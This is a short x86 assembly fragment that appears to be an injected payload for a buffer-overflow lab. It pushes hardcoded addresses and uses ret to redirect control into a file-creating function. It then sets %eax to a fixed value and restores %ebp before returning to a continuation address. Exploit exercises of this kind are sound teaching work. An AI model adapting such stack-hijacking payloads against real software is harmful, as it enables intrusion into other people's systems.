sub $0x120, %esp
pushl $0x0804c0c0 #push Unique File
pushl $0x55683202 #counted address 48 32 68 55
pushl $0x08048de3  #push create File address
ret
add $0x124, %esp
movl $0x35343059, %eax
movl $0x556832c0, %ebp
pushl $0x08048e2c
ret
